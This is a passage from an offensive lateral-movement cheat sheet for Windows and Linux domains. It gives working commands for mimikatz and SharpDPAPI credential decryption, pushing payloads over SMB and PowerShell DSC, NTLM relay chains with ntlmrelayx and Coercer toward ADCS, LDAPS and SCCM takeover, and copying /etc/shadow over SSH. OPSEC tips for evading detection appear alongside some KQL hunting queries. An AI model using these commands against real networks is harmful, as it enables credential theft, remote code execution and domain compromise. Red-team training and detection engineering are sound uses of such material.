#   user's plaintext password (dump from registry, file, etc.) — give
#   access to that user's DPAPI vault on any host they used.
# - Once domain backup key is in hand: enumerate user profile DPAPI
#   blob files on every workstation, decrypt offline, harvest saved
#   browser credentials → SaaS lateral, RDP saved → on-prem RDP
#   lateral, Vault credentials → various auth contexts.
#
# Mimikatz domain backup key extraction (run as DA on DC):
mimikatz # lsadump::backupkeys /system:DC01.target.local /export
# Files written: ntds_legacy_*.pvk (legacy backup key), ntds_capi_*.pfx (modern)
#
# Decrypt user master keys offline (no live access needed):
mimikatz # dpapi::masterkey /in:"C:\Users\victim\AppData\Roaming\Microsoft\Protect\<SID>\<MASTERKEY_GUID>" /pvk:ntds_legacy_*.pvk
# Returns the plaintext master key for the victim's profile.
#
# Decrypt specific DPAPI blob with master key:
mimikatz # dpapi::cred /in:"C:\Users\victim\AppData\Local\Microsoft\Credentials\<GUID>" /masterkey:<KEY>
mimikatz # dpapi::chrome /in:"...\Login Data" /masterkey:<KEY>
mimikatz # dpapi::vault /vault:"<vault_GUID>" /masterkey:<KEY>
#
# SharpDPAPI (GhostPack) — C# alternative for inline use in C2:
SharpDPAPI.exe machinemasterkeys     # local machine masterkeys
SharpDPAPI.exe credentials /pvk:base64_pvk_data   # all user creds
SharpDPAPI.exe rdg /pvk:...          # decrypt RDG saved RDP creds
SharpDPAPI.exe certificates /pvk:... # decrypt user certificate stores
#
# DonPAPI (login-as-domain-admin variant) — automated domain-wide
# DPAPI harvesting. Walks all domain-joined hosts, harvests user
# DPAPI blobs, decrypts with stolen domain backup key.
#
# DETECTION: Domain backup key extraction is the defender's nightmare
#   scenario — Event 4662 with the relevant attribute on DC, BUT the
#   blob harvesting on workstations is essentially undetectable unless
#   defenders monitor specific DPAPI blob file reads via Sysmon Event 11
#   and FIM. Defender for Identity has "Suspected DPAPI key request"
#   alert for the master key API call, but offline decryption produces
#   no telemetry.
# OPSEC RATING: VERY HIGH for offline decryption phase; HIGH for live
#   on-host extraction. Domain backup key theft is a one-time noisy
#   event followed by long-term silent decryption capability.
```

---

## 5 — WINDOWS: SMB & FILE SHARE OPERATIONS

```bash
# ═══════════════════════════════════════════════════════════
# SHARE ENUMERATION
# ═══════════════════════════════════════════════════════════
nxc smb 10.0.0.5 -u admin -p password --shares
smbclient -L //10.0.0.5/ -U 'domain\admin%password'
smbmap -H 10.0.0.5 -u admin -p password -d domain
# Find writable shares across subnet:
nxc smb 10.0.0.0/24 -u admin -p password --shares | grep -i "write"

# ═══════════════════════════════════════════════════════════
# FILE OPERATIONS
# ═══════════════════════════════════════════════════════════
# Mount share:
net use Z: \\10.0.0.5\C$ /user:domain\admin password
# Linux mount:
mount -t cifs //10.0.0.5/C$ /mnt -o username=admin,password=pass,domain=target
# smbclient interactive:
smbclient //10.0.0.5/C$ -U 'domain\admin%password'
smb: \> put payload.exe Windows\Temp\payload.exe
smb: \> get Users\admin\Desktop\secrets.txt
# Copy file to remote host (from Windows):
copy payload.exe \\10.0.0.5\C$\Windows\Temp\
xcopy C:\tools\*.exe \\10.0.0.5\C$\Windows\Temp\ /Y
# Then execute via WMI, schtasks, or sc \\remote
#
# DETECTION: Event ID 5140/5145 (network share access), SMB file copy events
# OPSEC RATING: MEDIUM — SMB file operations are common in enterprise networks

# ═══════════════════════════════════════════════════════════
# SCSHELL — FILELESS SCM LATERAL MOVEMENT
# ═══════════════════════════════════════════════════════════
# Changes service binary path of an EXISTING service → executes → reverts
# No new service created, no binary uploaded:
# SCShell.exe <target> <service_name> <payload_command> <domain> <user> <password>
SCShell.exe 10.0.0.5 XblAuthManager "C:\Windows\System32\cmd.exe /c beacon.exe" target.local admin password
# Modifies binpath → starts service → service fails (cmd.exe isn't valid service)
# but command executes → reverts binpath to original
#
# DETECTION: SCShell modifies the ImagePath (binpath) registry value of an existing service.
#   This generates Sysmon Event ID 13 (registry value set) on the service's ImagePath key
#   under HKLM\SYSTEM\CurrentControlSet\Services\<ServiceName>.
#   Security log Event ID 4657 ("a registry value was modified") also captures this
#   if registry auditing (SACL) is configured on the Services key.
#   Event ID 7040 specifically logs service START TYPE changes, not binpath changes.
#   Event ID 7045 (new service) is NOT generated since no new service is created.
#   The key detection is: registry modification on a service's ImagePath value
#   followed by service start, followed by another ImagePath modification (revert).
#   No 7045 (no NEW service) — harder to detect than PsExec
# OPSEC RATING: MEDIUM-HIGH — no binary, no new service, but registry change is logged
#   by Sysmon 13 (always) and Security 4657 (if SACL configured)

# ═══════════════════════════════════════════════════════════
# POWERSHELL DSC PUSH MODE LATERAL (T1021.006 + T1059.001)
# ═══════════════════════════════════════════════════════════
# PowerShell Desired State Configuration (DSC) provides a legitimate
# "push" mechanism: an authorized admin pushes a configuration MOF file
# to a target host, which the Local Configuration Manager (LCM) applies
# as SYSTEM. From an operator perspective: arbitrary code execution as
# SYSTEM on any target where the operator has admin rights, via a
# Microsoft-supplied PowerShell module that admin tools never alert on.
#
# Requirements: admin rights on target; WinRM listener (default on
# Server, must be enabled on Workstation); DSC PowerShell module
# installed (pre-installed on all current Windows builds).
#
# Push mode invocation (from attacker workstation):
$cred = Get-Credential
# Build a configuration that runs arbitrary script:
Configuration EvilConfig {
    param ([string]$Cmd)
    Node localhost {
        Script Pwn {
            GetScript  = { @{} }
            TestScript = { $false }
            SetScript  = { Invoke-Expression $using:Cmd }
        }
    }
}
EvilConfig -Cmd "C:\Windows\Temp\beacon.exe" -OutputPath C:\temp\evil
Start-DscConfiguration -Path C:\temp\evil -ComputerName 10.0.0.5 `
    -Credential $cred -Wait -Force -Verbose
# Target's LCM applies the configuration → Script resource fires →
# beacon executes as SYSTEM (LCM context).
#
# WHY THIS WORKS:
# - DSC is signed Microsoft tooling — bypasses many script-content
#   detection rules.
# - LCM runs as SYSTEM via the WinRM listener.
# - PowerShell logging captures the DSC invocation but the actual
#   payload is wrapped in a DSC Script resource, which is less
#   visually obvious in script-block logs than a direct
#   Invoke-Command running malicious code.
# - DSC inventory operations are commonly disabled / not monitored
#   in environments not actively using DSC for configuration management.
#
# DETECTION: WinRM operational log Event 91 (DSC operation), Event 4104
#   (PowerShell ScriptBlock) capturing the encoded MOF compilation.
#   DSC ETW provider Microsoft-Windows-Dsc surfaces operation events.
#   File creation in C:\Windows\System32\Configuration\ on target.
# OPSEC RATING: MEDIUM-HIGH — uses signed Microsoft module, looks like
#   legitimate configuration management. If DSC is not in active use
#   in the target environment, the FIRST DSC operation against a host
#   may itself be anomalous to baseline-aware defenders.
```

---

## 6 — NTLM RELAY AS LATERAL MOVEMENT

```bash
# NTLM relay is not just credential capture — it's active lateral movement:
# Captured authentication is forwarded in real-time to a different target.
#
# ═══════════════════════════════════════════════════════════
# 2026 LANDSCAPE — WHY THIS IS HARDER NOW
# ═══════════════════════════════════════════════════════════
# The relay attack surface has narrowed significantly with Microsoft's
# Secure Future Initiative defaults. Operators must understand the
# specific defenses to know what still works.
#
# SMB SIGNING (Microsoft Secure Future Initiative, Win11 24H2 / Server 2025):
# - Windows 11 24H2 Enterprise/Pro/Education REQUIRE both inbound AND
#   outbound SMB signing by default. This blocks SMB relay against any
#   Win11 24H2 SMB server and prevents SMB relay from any Win11 24H2
#   client (the attacker can't inject signed packets with a captured
#   session key alone).
# - Windows Server 2025 requires outbound SMB signing only by default.
#   Inbound enforcement is administrative configuration.
# - Windows 11 23H2, 22H2, Win10, Server 2022, Server 2019 — NOT
#   default-on. Many enterprise environments still run these versions
#   as the bulk of the fleet.
# - Active Directory Domain Controllers have ALWAYS required SMB
#   signing on SYSVOL/NETLOGON shares — that's not a 2025 change.
#
# LDAP SIGNING + CHANNEL BINDING (Server 2025 default change) — Phase 1 C2 fix:
# - Server 2025 DCs SHIP with "LDAP server signing requirements" set to
#   "Require Signing" by default in FRESH installs (greenfield). This
#   blocks unsigned LDAP binds → LDAP relay over plaintext LDAP (port 389)
#   fails against fresh Server 2025 DCs.
# - LDAP channel binding (LdapEnforceChannelBinding policy):
#     KB5021130 introduced staged rollout. Per Microsoft "Compatibility
#     mode REMOVED" enforcement reached its full state in 2H 2025
#     (originally scheduled March 2024, deferred multiple times to
#     accommodate ecosystem readiness). Current state on a fresh Server
#     2025 DC: defaults to "Negotiate" / "When supported" — NOT "Always".
#     Channel binding is therefore enforced only WHEN THE CLIENT supplies
#     CBTs. The majority of relayable client types (legacy Windows
#     workstations using NTLM, MS-RPRN coercion targets) do NOT supply
#     CBTs in their relayed authentication, so LDAPS relay remains
#     viable against most Server 2025 DC default configurations.
#     Source: https://support.microsoft.com/en-us/topic/kb5021130
#     Verify per environment via:
#       Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Services\NTDS\Parameters" `
#         -Name LdapEnforceChannelBinding
#       (0=Disabled, 1=Negotiate (default), 2=Always)
# - Older Server 2019/2022 DCs unchanged — relay still works against
#   them by default unless administrators have explicitly enforced
#   LDAP signing or channel binding.
# - CVE-2025-54918 documents the relay misconfiguration risk specifically
#   for environments that haven't enforced both signing AND channel
#   binding. This is the current operator-facing CVE-as-environmental-
#   indicator for relay opportunity.
#
# UPGRADE INSTALLATIONS (operator-relevant detail):
# - Per Microsoft documentation: existing policies preserved on upgrade.
#   An organization that upgrades from Server 2022 to Server 2025
#   without changing GPOs retains the legacy LDAP signing default
#   (None / unenforced). Greenfield Server 2025 deployments get the
#   new defaults; brownfield upgrades do not.
# - Same applies to SMB signing on hosts: existing GPO settings are
#   preserved. Many enterprises explicitly disable SMB signing for
#   compatibility with legacy SMB servers (NAS appliances, older Linux
#   Samba versions). Always check actual policy via
#   Get-SmbServerConfiguration / Get-SmbClientConfiguration on a
#   target before assuming signing is enforced.
#
# RELAY OPPORTUNITIES THAT REMAIN VIABLE:
# 1. Relay to AD CS HTTP endpoints WITHOUT EPA enforced (ESC8) —
#    still common, even in 2025-2026 environments. Microsoft has
#    published guidance to enable EPA but adoption is incomplete.
# 2. Relay to LDAPS without channel binding enforcement — viable on
#    most Server 2019/2022 DCs and on Server 2025 DCs by default
#    (channel binding is "When supported" not "Always").
# 3. Relay to SMB servers running Server 2019/2022 or Win10/11 23H2-
#    without signing enforced (the common enterprise majority).
# 4. Relay to MSSQL, Exchange, SharePoint, and other application
#    services that may not enforce signing on inbound connections.
# 5. WebDAV-to-SMB relay variants where the target accepts WebDAV
#    auth that gets relayed onward.

# ═══════════════════════════════════════════════════════════
# CROSS-PROTOCOL RELAY MATRIX
# Source protocol (where auth is captured) × Target protocol (where
# it is forwarded to). Cells show what blocks the chain in 2026 default.
# ═══════════════════════════════════════════════════════════
#
# Legend:
#   OK     = Works in default config of common 2025-2026 enterprise
#   SIGN   = Blocked by SMB signing required (Win11 24H2/Srv 2025 default;
#            Win10/11 23H2-/Srv 2019/2022 not default)
#   CB     = Blocked by LDAP channel binding "Always" (NOT default; Server
#            2025 still defaults to "When supported" — relay viable)
#   LSIGN  = Blocked by LDAP signing required (Server 2025 DC default;
#            older DCs not default)
#   EPA    = Blocked by Extended Protection for Authentication on the
#            HTTP endpoint (ADCS Web Enrollment, Exchange OWA/EWS)
#   MIC    = Blocked by NTLM Message Integrity Code if MIC validation
#            enforced (Server 2019+ Drop the MIC mitigation, partial)
#   N/A    = Protocol mismatch (can't relay an SMB auth to a SMTP server
#            without protocol bridge)
#
#                          ┌──────────────────── TARGET ────────────────────┐
# SOURCE              │ SMB(445)  │ LDAP(389) │ LDAPS(636)│ ADCS HTTP│ MSSQL │ EWS/OWA │
# ────────────────────┼───────────┼───────────┼───────────┼──────────┼───────┼─────────┤
# SMB (445)           │ SIGN      │ LSIGN     │ CB        │ EPA      │ OK*   │ EPA     │
# WebDAV (HTTP/HTTPS) │ SIGN      │ LSIGN     │ CB        │ EPA      │ OK*   │ EPA     │
# HTTP (proxy/intra)  │ SIGN      │ LSIGN     │ CB        │ EPA      │ OK*   │ EPA     │
# HTTPS (intra)       │ SIGN      │ LSIGN     │ CB        │ EPA      │ OK*   │ EPA     │
# IMAP/SMTP (auth)    │ SIGN      │ LSIGN     │ CB        │ EPA      │ OK*   │ N/A     │
# MSSQL (TDS)         │ SIGN      │ LSIGN     │ CB        │ EPA      │ N/A   │ N/A     │
#
# * OK = MSSQL relay works because MSSQL service does not enforce SMB-
#   style signing on inbound NTLM. The classical xp_dirtree → relay →
#   command execution path. Can be combined with linked-server chains
#   for cross-tier movement.
#
# 2025-2026 NOTES:
# - WebDAV-to-SMB historically bypassed signing-not-required (because
#   WebDAV-originated auth lacks the SPN that would mandate signing).
#   Microsoft's KB5005413 changed how WebDAV-originated auth carries
#   target SPN, partially mitigating this on patched targets.
# - HTTP coercion (from PetitPotam over HTTP, or via ms-DFSNM) →
#   relay still viable to most non-EPA endpoints.
# - LDAPS channel binding = current weak link in default Server 2025
#   deployments — that's the pivot most operators target first.
# - ESC8 (relay to AD CS Web Enrollment without EPA) remains the
#   single most reliable "domain compromise in one step" primitive
#   when present.
#
# OPERATOR DECISION:
# - Have SMB signing enforced everywhere? Relay to MSSQL or HTTP/EWS.
# - Have LDAPS CB enforced? Relay to AD CS Web Enrollment instead.
# - Have everything enforced? Look for legacy compatibility exceptions —
#   third-party SMB servers (NAS), older Linux Samba, embedded
#   appliances (printers, KVMs, IPMI) — almost always at least one
#   exception exists in real environments.

# ═══════════════════════════════════════════════════════════
# PREREQUISITES
# ═══════════════════════════════════════════════════════════
# Check SMB signing on targets (relay to SMB requires signing NOT REQUIRED):
nxc smb 10.0.0.0/24 -u '' -p '' --gen-relay-list relay_targets.txt
# Output lists hosts where SigningRequired=False — relay candidates.
# On Win11 24H2+ / Server 2025 environments this list shrinks dramatically.
#
# Check LDAP signing/channel binding (relay to LDAP/LDAPS):
nxc ldap DC01 -u user -p password -M ldap-checker
# Reports whether DC enforces signing and channel binding.
# LDAP signing-required = relay to LDAP (389) blocked.
# LDAP channel binding "Always" = relay to LDAPS (636) blocked.
# Either policy at "Negotiate" / "When supported" = relay viable.
#
# Check AD CS Web Enrollment EPA (relay to ADCS HTTP):
# Manual check — visit https://CA-SERVER/certsrv/ and inspect HTTP
# response headers for EPA-related indicators; or use AD CS-targeted
# enumeration via Certipy:
certipy find -u attacker -p Pass -dc-ip 10.0.0.1 -vulnerable -stdout
# Certipy reports ESC8 (Web Enrollment without EPA) when present.

# ═══════════════════════════════════════════════════════════
# RELAY CHAINS FOR LATERAL MOVEMENT
# ═══════════════════════════════════════════════════════════
# Relay captured SMB auth to execute command on a DIFFERENT host:
impacket-ntlmrelayx -tf relay_targets.txt -smb2support -c "whoami"
# Relay to SMB with file execution:
impacket-ntlmrelayx -tf relay_targets.txt -smb2support -e payload.exe
# Relay to SMB for interactive shell via socks proxy:
impacket-ntlmrelayx -tf relay_targets.txt -smb2support -socks
# Then connect through SOCKS: proxychains smbclient //TARGET/C$ -U 'domain/user'
#
# Relay to LDAP/LDAPS for domain escalation:
impacket-ntlmrelayx -t ldaps://DC01 --escalate-user attacker
impacket-ntlmrelayx -t ldaps://DC01 --delegate-access -smb2support
impacket-ntlmrelayx -t ldaps://DC01 --shadow-credentials --shadow-target victim$
# --shadow-credentials writes msDS-KeyCredentialLink on the target object —
# enabling subsequent PKINIT auth as that account (see Privesc Section 7).
#
# Relay to ADCS for certificate theft (ESC8):
impacket-ntlmrelayx -t http://CA-SERVER/certsrv/certfnsh.asp --adcs --template DomainController
# With -smb2support and coercion, this remains the most reliable single-
# step domain compromise primitive against environments with default AD CS
# Web Enrollment + DC-to-CA NTLM connectivity.
#
# WebDAV-to-SMB relay variant (when target is reachable via WebDAV):
impacket-ntlmrelayx -t smb://10.0.0.5 -smb2support --webdav-port 80
# WebDAV uses HTTP transport but authenticates via NTLM; can be used to
# relay to SMB targets when direct SMB relay is blocked by signing.
#
# TRIGGER NTLM AUTH: See AD Cheat Sheet Section 3 (Coercion Attacks)
# + Persistence Cheat Sheet Section 13 (SCF/URL/desktop.ini file drops)
# Tools: PetitPotam, DFSCoerce, PrinterBug (MS-RPRN), Coercer (multi-protocol)
#
# ═══════════════════════════════════════════════════════════
# SCCM TAKEOVER CHAIN (Misconfiguration Manager TAKEOVER-1/-2) — NEW
# Cross-ref: Persistence cheatsheet §6.4 + Initial Access §3
# Source: https://github.com/subat0mik/Misconfiguration-Manager
# MITRE ATT&CK: T1557.001 (NTLM Relay) + T1078 (Valid Accounts)
# STEALTH: MEDIUM | SUCCESS: HIGH on default-config SCCM
# ═══════════════════════════════════════════════════════════
# SpecterOps "Misconfiguration Manager" methodology (Garrett Foster +
# Chris Thompson, 2024) catalogs 8+ TAKEOVER primitives against ConfigMgr
# (SCCM). The most operationally devastating:
#
# TAKEOVER-1: COERCED PRIMARY-SITE-SERVER → MSSQL DB RELAY → SITE TAKEOVER
# Pattern:
# 1. Coerce primary site server's MACHINE ACCOUNT to authenticate to
#    operator-controlled host via PetitPotam / DFSCoerce / PrinterBug.
# 2. Relay that NTLM auth to the SCCM site database SQL server.
# 3. Site server has db_owner on the CM_<sitecode> database by default.
# 4. With db_owner: insert collection + deployment that runs operator
#    payload as SYSTEM on every managed client.
#
# Tools:
SharpSCCM.exe local site-info               # discover site code + DB
impacket-petitpotam SITESERVER01 -u attacker -p pass
impacket-ntlmrelayx -t mssql://SQLSITE01 \
  -smb2support -socks --no-validate-privs
# Then via SOCKS — SQL admin on CM_PSC (the site DB) → upload .ps1
# payload via SCCM console + deploy to All Systems collection.
#
# TAKEOVER-2: COERCED CAS / PARENT SITE → CHILD SITE TAKEOVER
# In multi-site SCCM hierarchies, primary site machine accounts often
# have admin rights cross-site. Single coercion → fan-out across all
# sites in hierarchy.
#
# DETECTION: SCCM SQL audit on collection + deployment creation; MDI
#   "Suspected NTLM relay attack" with SQL service account as recipient;
#   anomalous SiteServer$ machine-account NTLM auth pattern.
# OPSEC RATING: MEDIUM — coercion is detectable but the relay-to-SQL
#   path is rarely instrumented in practice.

# ═══════════════════════════════════════════════════════════
# EPM RELAY (CVE-2025-49760) + WEBCLIENT WORKSTATION COERCION — NEW
# MITRE ATT&CK: T1557.001
# STEALTH: MEDIUM | SUCCESS: HIGH on unpatched | SKILL: MED
# ═══════════════════════════════════════════════════════════
# CVE-2025-49760 — Microsoft Endpoint Manager (Intune-related component)
# spoofing variant enabling NTLM coercion → relay primitive on
# enterprise EPM deployments. Patched July 2025 patch Tuesday.
# Source: https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-49760
#
# Companion primitive: WebClient (WebDAV redirector) on Win10/11
# workstations is set to "Manual (Trigger Start)" by default — the
# service IS triggerable on demand via UNC paths matching
# \\server@PORT\path or \\server@SSL@PORT\path patterns. Operator can
# trigger WebClient remotely (e.g., via DFS resolution, via crafted
# search-ms URI handler) → workstation coerced into outbound HTTP NTLM
# auth that operator captures + relays.
#
# Coerce WebClient to attacker host:
# - Drop crafted .url, .lnk, or search-ms file in writable share
# - Or use Coercer for direct WebDAV coercion:
Coercer coerce -u attacker -p pass -t TARGET-WORKSTATION \
  -l ATTACKER-IP --webclient
# - Or PetitPotam over WebDAV (when EFS-RPC variant available)
#
# Relay onward — typically to LDAPS (--shadow-credentials on TARGET$
# computer object) or to ADCS (--adcs --template Machine):
impacket-ntlmrelayx -t ldaps://DC01 --shadow-credentials \
  --shadow-target TARGET-WORKSTATION$ -smb2support
# Result: PKINIT auth as TARGET-WORKSTATION$ → local SYSTEM via S4U2Self
# tgtdeleg trick.
#
# DETECTION: WebClient service start events on hosts that don't normally
#   browse WebDAV resources. SACL audit on
#   msDS-KeyCredentialLink writes to computer objects.
# OPSEC RATING: MEDIUM — WebClient trigger is subtle but the LDAPS
#   shadow-credential write is high-fidelity for any MDI deployment.

# DETECTION: Unusual SMB connections between hosts that don't normally
#   communicate. NTLM auth from one host appearing on different target
#   simultaneously. Defender for Identity raises "Suspected NTLM relay
#   attack" on sequential auth pattern. KQL on simultaneous 4624 type 3
#   events for same user across multiple hosts.
# OPSEC RATING: MEDIUM-LOW — requires positioning (man-in-the-middle or
#   coercion) and the relay target must lack appropriate signing/binding.
#   2025-2026 environment increasingly hostile but still viable on
#   bulk-of-fleet legacy.
```

---

## 7 — WINDOWS: OPSEC & DETECTION REFERENCE

```
LATERAL MOVEMENT DETECTION SIGNATURES:
──────────────────────────────────────────────────────────────
TECHNIQUE      │ KEY EVENT IDS                    │ SYSMON           │ NETWORK
───────────────┼──────────────────────────────────┼──────────────────┼──────────────────
PsExec         │ 7045, 4697, 4624(3)              │ 1, 11, 13, 17/18 │ SMB (445)
SMBExec        │ 7045, 4624(3)                    │ 1, 13            │ SMB (445)
WMIExec        │ 4648, 4624(3)                    │ 1 (wmiprvse→cmd) │ RPC (135+dyn)
DCOMExec       │ 4624(3)                          │ 1 (dllhost/mmc)  │ RPC (135+dyn)
AtExec         │ 4698, 4699, 4624(3)              │ 1                │ SMB (445)
WinRM          │ 4624(3), 91, 168 (WinRM ops)     │ 1                │ HTTP (5985/5986)
RDP            │ 4624(10), 21/25 (TS-LSM)         │ 1                │ RDP (3389)
SCM remote     │ 7045, 4624(3)                    │ 1, 13            │ SMB (445)
Schtasks /s    │ 4698, 4699                       │ 1                │ SMB (445)
PTH            │ 4624(3) NTLM package             │ —                │ SMB/RPC
Overpass-Hash  │ 4768 (AS-REQ)                    │ —                │ Kerberos (88)
PTT            │ 4624(3) Kerberos package          │ —                │ Kerberos (88)

STEALTH RANKING (quietest → noisiest):
  1. DCOM (dcomexec)          — fewest signatures on older OS; broken/flagged on Win11 24H2+/Srv 2025
  2. WinRM / PS Remoting      — encrypted, looks like admin activity
  3. WMI (wmiexec)            — no binary, but wmiprvse child process visible
  4. AtExec                   — task created+deleted quickly
  5. SCShell                  — no new service, config change only
  6. SMBExec                  — service but no binary
  7. Schtasks remote          — task creation logged
  8. PsExec                   — binary + service + multiple events
  9. RDP                      — full interactive session, very visible
  10. nxc mass execution      — hundreds of auth events across subnet

HUNTING QUERIES (KQL — Microsoft Defender for Endpoint / Sentinel):

// PsExec service install — service binary in ADMIN$ or unusual path
DeviceEvents
| where ActionType == "ServiceInstalled"
| where ServiceFileName has_any (@"\ADMIN$\", @"\Windows\TEMP\",
                                   @"\Users\Public\", @"\ProgramData\")
   or ServiceName has_any ("BTOBTO", "PSEXESVC", "RemCom")
| project Timestamp, DeviceName, ServiceName, ServiceFileName,
          InitiatingProcessAccountName, RemoteIP

// SMBExec service binPath pattern (cmd.exe redirection)
DeviceEvents
| where ActionType == "ServiceInstalled"
| extend BinPath = tostring(parse_json(AdditionalFields).ServiceImagePath)
| where BinPath has_any ("cmd.exe /Q /c", @"> \\127.0.0.1\")
   or BinPath has_any (@"\__output", @"\Windows\Temp\__")
| project Timestamp, DeviceName, ServiceName, BinPath, InitiatingProcessAccountName

// WMIExec — wmiprvse spawning shells
DeviceProcessEvents
| where InitiatingProcessFileName =~ "wmiprvse.exe"
| where FileName in~ ("cmd.exe", "powershell.exe", "powershell_ise.exe")
| where ProcessCommandLine has_any (@"\__", @"> \\", "127.0.0.1\\ADMIN$")
   or InitiatingProcessCommandLine has @"-Embedding"
| project Timestamp, DeviceName, FileName, ProcessCommandLine,
          InitiatingProcessCommandLine, AccountName

// DCOMExec — anomalous parent process spawning shells
DeviceProcessEvents
| where InitiatingProcessFileName in~ ("mmc.exe", "dllhost.exe", "explorer.exe")
| where FileName in~ ("cmd.exe", "powershell.exe")
| where InitiatingProcessCommandLine has_any
    ("MMC20.Application", "/Processid:", "Embedding")
| project Timestamp, DeviceName, FileName, ProcessCommandLine,
          InitiatingProcessFileName, InitiatingProcessCommandLine

// AtExec — scheduled task with output file pattern
DeviceProcessEvents
| where FileName =~ "schtasks.exe"
| where ProcessCommandLine has " /create "
| where ProcessCommandLine has @"\Windows\Temp\"
   and ProcessCommandLine matches regex @"[a-zA-Z0-9]{8}\.tmp"
| project Timestamp, DeviceName, AccountName, ProcessCommandLine

// AtExec via direct API — Task Scheduler operational log
DeviceEvents
| where ActionType == "ScheduledTaskCreated"
| where InitiatingProcessAccountName !contains "system"
| extend TaskName = tostring(parse_json(AdditionalFields).TaskName)
| where TaskName matches regex @"^[a-zA-Z0-9]{8}$"   // random 8-char Impacket pattern
| project Timestamp, DeviceName, TaskName, InitiatingProcessAccountName, RemoteIP

// WinRM unusual host pair — admin connection from non-admin host
DeviceLogonEvents
| where LogonType == "Network"
| where InitiatingProcessFileName =~ "wsmprovhost.exe"
   or RemoteDeviceName has "WinRM"
| summarize ConnectionCount = count(),
            SourceHosts = make_set(RemoteIP, 50)
            by AccountName, DeviceName
| where array_length(SourceHosts) >= 1
       and DeviceName !in (jump_servers_baseline)

// SCShell — service binPath modify-restart-modify pattern
DeviceRegistryEvents
| where ActionType == "RegistryValueSet"
| where RegistryKey matches regex
    @"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\[^\\]+\\ImagePath"
| project Timestamp, DeviceName, RegistryKey, RegistryValueData,
          InitiatingProcessFileName
| join kind=inner (DeviceRegistryEvents
    | where ActionType == "RegistryValueSet"
    | where RegistryKey matches regex
        @"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\[^\\]+\\ImagePath"
    | project T2 = Timestamp, DeviceName, RegistryKey, NewValue = RegistryValueData)
    on DeviceName, RegistryKey
| where T2 > Timestamp and T2 - Timestamp < 5m
       and NewValue != RegistryValueData
| project Timestamp, T2, DeviceName, RegistryKey,
          OriginalValue = RegistryValueData, ModifiedValue = NewValue

// RDP from unfamiliar source IP / host pair
DeviceLogonEvents
| where LogonType == "RemoteInteractive"   // RDP
| where ActionType == "LogonSuccess"
| extend SourceHash = strcat(RemoteIP, "|", AccountName)
| join kind=leftanti (DeviceLogonEvents
    | where Timestamp between (ago(60d) .. ago(7d))
    | where LogonType == "RemoteInteractive"
    | where ActionType == "LogonSuccess"
    | extend BaselineHash = strcat(RemoteIP, "|", AccountName)
    | distinct DeviceName, BaselineHash) on DeviceName, $left.SourceHash == $right.BaselineHash
| project Timestamp, DeviceName, AccountName, RemoteIP

// NTLM auth from host pair never seen in recent baseline
DeviceLogonEvents
| where LogonType == "Network"
| where ActionType == "LogonSuccess"
| extend AuthPackage = tostring(parse_json(AdditionalFields).LogonProtocol)
| where AuthPackage =~ "NTLM"
| extend HostPair = strcat(RemoteIP, "→", DeviceName)
| join kind=leftanti (DeviceLogonEvents
    | where Timestamp between (ago(60d) .. ago(7d))
    | where LogonType == "Network"
    | extend AuthPackage = tostring(parse_json(AdditionalFields).LogonProtocol)
    | where AuthPackage =~ "NTLM"
    | extend BaselinePair = strcat(RemoteIP, "→", DeviceName)
    | distinct BaselinePair) on $left.HostPair == $right.BaselinePair
| project Timestamp, AccountName, RemoteIP, DeviceName, HostPair

// DCSync from non-DC source IP (high-fidelity Impacket secretsdump)
SecurityEvent
| where EventID == 4662
| where ObjectName has_any
    ("1131f6aa-9c07-11d1-f79f-00c04fc2dcd2",     // DS-Replication-Get-Changes
     "1131f6ad-9c07-11d1-f79f-00c04fc2dcd2")     // DS-Replication-Get-Changes-All
| where SubjectUserName !endswith "$"             // not a DC computer account
   and IpAddress !in (known_dc_ips)
| project TimeGenerated, Computer, SubjectUserName, IpAddress, ObjectName

// Coercion auth attempts (PetitPotam / DFSCoerce / PrinterBug precursor)
SecurityEvent
| where EventID == 5145              // detailed file share access
| where ShareName == @"\\*\IPC$"
| where RelativeTargetName has_any
    ("efsrpc",        // PetitPotam (MS-EFSRPC)
     "lsarpc",        // potential PetitPotam variant
     "spoolss",       // PrinterBug (MS-RPRN)
     "netdfs",        // DFSCoerce
     "FssagentRpc")   // FSS coerce
| project TimeGenerated, Computer, SubjectUserName, IpAddress,
          ShareName, RelativeTargetName

// JA3/JA4 fingerprint hunting — Chisel / Ligolo / Sliver / Havoc client
// signatures. Requires Zeek / Suricata / Corelight TLS fingerprint
// telemetry forwarded to Sentinel via a custom table (e.g.
// CommonSecurityLog or a dedicated TLSFingerprints_CL).
//
// Sample signatures (current as of early 2026; update from your
// network telemetry vendor's threat feed):
let known_offensive_ja3 = dynamic([
    // Common Go-based tunneling clients (Chisel, Ligolo-ng default)
    "19e29534fd49dd27d09234e639c4057e",   // Go HTTP/2 client (multiple tools)
    // Sliver default mTLS
    "475c9302dc42b2751db9edcac3b74891",
    // Havoc demon HTTP listener default
    "cd08e31494f9531f560d64c695473da9"
]);
let known_offensive_ja4 = dynamic([
    "t13d1516h2_8daaf6152771_b186095e22b6",   // Go default TLS 1.3
    "t13d1715h2_5b57614c22b0_3d5424432f57"    // Sliver-style fingerprint
]);
TLSFingerprints_CL
| where ja3_hash_s in (known_offensive_ja3)
   or ja4_hash_s in (known_offensive_ja4)
| where DestinationPort_d in (443, 8443, 11601, 8080, 8081)
       or DestinationIP_s !in (known_internal_subnets)
| project TimeGenerated, SourceIP_s, DestinationIP_s, DestinationPort_d,
          ja3_hash_s, ja4_hash_s, sni_s
//
// Operator counter: rebuild Chisel/Ligolo with custom uTLS profiles
// matching browser fingerprints, OR tunnel through legitimate-
// fingerprint front (cloudflared, Tailscale) — see Section 10.
```

---

## 8 — LINUX: SSH & REMOTE EXECUTION

```bash
# ═══════════════════════════════════════════════════════════
# SSH WITH CREDENTIALS / KEYS (T1021.004)
# ═══════════════════════════════════════════════════════════
ssh user@10.0.0.5
ssh -i stolen_key.pem user@10.0.0.5
# Force password auth (bypass key):
ssh -o PreferredAuthentications=password user@10.0.0.5
# Non-interactive command execution:
ssh user@10.0.0.5 "id && hostname && cat /etc/shadow"
# Copy files:
scp payload user@10.0.0.5:/tmp/
scp user@10.0.0.5:/etc/shadow /tmp/
# Recursive copy:
scp -r /tools/ user@10.0.0.5:/tmp/tools/
#
# DETECTION: /var/log/auth.log (SSH login events), sshd entries
# OPSEC RATING: MEDIUM — SSH is expected traffic, but auth logs show source IP

